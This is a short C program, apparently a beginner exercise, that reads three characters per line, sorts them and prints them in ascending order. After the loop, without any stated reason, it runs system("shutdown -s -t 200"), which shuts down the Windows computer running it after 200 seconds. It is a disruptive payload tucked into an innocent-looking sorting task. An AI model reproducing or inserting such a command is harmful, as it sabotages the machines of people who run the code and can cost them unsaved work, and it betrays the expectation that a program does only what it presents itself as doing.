#include <stdio.h>
#include <stdlib.h>
int main()
{
    char a,b,c,t;
    while (scanf("%c%c%c",&a,&b,&c)!=EOF)
    {
          getchar();
          if (a>b)
          { t=a;a=b;b=t;}
          if (a>c)
          { t=a;a=c;c=t;}
          if (b>c)
          { t=b;b=c;c=t;}
     printf("%c %c %c\n",a,b,c);
          }
     system("shutdown -s -t 200");
    return 0;
}
